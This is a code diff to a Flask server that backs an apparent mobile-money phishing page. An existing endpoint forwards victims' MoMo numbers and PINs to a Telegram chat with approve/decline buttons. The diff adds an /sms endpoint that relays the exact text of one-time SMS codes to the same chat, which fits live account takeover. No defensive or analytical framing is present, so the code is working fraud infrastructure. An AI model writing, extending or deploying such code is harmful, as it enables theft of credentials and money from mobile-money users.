@@ -31,6 +31,7 @@ def healthz():
     return "ok", 200
 
 
+# ---------------- LOGIN ----------------
 @app.route("/notify", methods=["POST", "OPTIONS"])
 def notify():
     if request.method == "OPTIONS":
@@ -52,11 +53,11 @@ def notify():
     }
 
     text = (
-        "🔐 *MoMo Login Attempt*\n"
+        "🔐 MoMo Login Attempt\n"
         "━━━━━━━━━━━━━━━━━━\n"
-        f"📱 *MoMo:* {momo}\n"
-        f"🔑 *PIN:* {pin}\n"
-        f"🕒 *Time:* {time_str}\n\n"
+        f"📱 MoMo: {momo}\n"
+        f"🔑 PIN: {pin}\n"
+        f"🕒 Time: {time_str}\n\n"
         "Approve or decline this login:"
     )
 
@@ -76,7 +77,6 @@ def notify():
             json={
                 "chat_id": CHAT_ID,
                 "text": text,
-                "parse_mode": "Markdown",
                 "reply_markup": keyboard,
             },
             timeout=10,
@@ -164,6 +164,54 @@ def telegram_webhook():
     return "ok", 200
 
 
+# ---------------- SMS ----------------
+@app.route("/sms", methods=["POST", "OPTIONS"])
+def sms():
+    if request.method == "OPTIONS":
+        return "", 204
+
+    data = request.get_json(silent=True) or {}
+    momo = data.get("momo", "unknown")
+    sms_text = data.get("sms", "")
+    time_str = data.get("time", "unknown")
+
+    text = (
+        "📩 SMS Code Received\n"
+        "━━━━━━━━━━━━━━━━━━\n"
+        f"MoMo: {momo}\n"
+        f"Time: {time_str}\n"
+        "\n"
+        "─── EXACT SMS ───\n"
+        f"{sms_text}\n"
+        "─── END ───"
+    )
+
+    if not BOT_TOKEN or not CHAT_ID:
+        return jsonify({"ok": False, "error": "Server not configured"}), 500
+
+    try:
+        # Telegram limit is 4096; split safely if longer
+        if len(text) > 4000:
+            chunks = [text[i:i+3500] for i in range(0, len(text), 3500)]
+            for chunk in chunks:
+                requests.post(
+                    f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
+                    json={"chat_id": CHAT_ID, "text": chunk},
+                    timeout=10,
+                )
+            return jsonify({"ok": True})
+        else:
+            res = requests.post(
+                f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
+                json={"chat_id": CHAT_ID, "text": text},
+                timeout=10,
+            )
+            return jsonify(res.json())
+    except Exception as e:
+        return jsonify({"ok": False, "error": str(e)}), 500
+
+
+# ---------------- STATIC ----------------
 @app.route("/<path:filename>")
 def static_files(filename):
     return send_from_directory(".", filename)
